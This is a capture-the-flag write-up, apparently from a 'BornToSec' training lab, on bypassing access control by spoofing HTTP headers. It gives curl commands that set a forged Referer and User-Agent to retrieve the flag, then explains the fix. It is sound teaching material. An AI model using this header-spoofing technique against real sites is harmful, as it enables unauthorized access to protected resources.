# Broken Access Control via HTTP headers spoofing

## 📖 Vulnerability Explanation
Broken access control vulnerability is a security flaw that allows unauthorized users to access, modify, or delete data they shouldn't have access to.

The app grants access to a resource (in this case the flag), using HTTP headers. An attacker can spoof these headers to trick the server and get access to it. 

## ⚙️ Exploitation Process
We can see two comments containing hints on how we should make the requests.

- The following command shows only the comments in the HTML code:

```
curl -s 'http://BornToSec.com/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' | grep -v '^$' | grep -A 2 '<!--'
```

This reveals two interesting statements:

1. ```You must come from : "https://www.nsa.gov/".```: It suggests the use of the Referer HTTP header, which is used to specify the previous url visited by the user. 

2. ```Let's use this browser : "ft_bornToSec". It will help you a lot.```: This refers to the User-Agent header, used to provide information about the agent (Firefox, Chrome, _curl_...) used to send the request.

---

- We can get the flag by specifying these headers in the request:
```
curl -s -H 'Referer: https://www.nsa.gov/' -H 'User-Agent: ft_bornToSec' 'http://BornToSec.com/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' | grep flag
```

## 🔧 Fix
The server should never rely on modifiable data provided by the user for authentication, such as HTTP headers. In order to protect a resource, it's necessary to validate proper user permissions.

## ☝️🤓 Advanced explanation
It is also possible to protect public resources against bulk automated requests (like scraping or brute-force) by inspecting HTTP headers. While these headers should never be used for access control, they can help detect suspicious behavior patterns.

For example, blocking requests checking missing User-Agent or Referer headers can slow down or stop bots.

> This is not a security control, but a defense in depth strategy to protect public resources